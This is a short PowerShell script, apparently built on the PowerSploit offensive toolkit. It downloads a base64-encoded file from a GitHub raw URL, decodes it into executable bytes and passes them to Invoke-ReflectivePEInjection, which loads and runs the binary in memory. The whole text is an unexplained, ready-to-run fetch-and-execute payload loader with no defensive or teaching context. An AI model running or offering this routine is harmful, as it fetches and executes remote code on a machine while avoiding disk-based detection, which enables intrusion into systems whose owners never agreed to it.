$b64s = (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/armysick/PowerSploit/master/CodeExecution/b64.file')
$PEB = [System.Convert]::FromBase64String($b64s)
Import-Module .\Invoke-ReflectivePEInjection.ps1
Invoke-ReflectivePEInjection.ps1 -PEBytes $PEB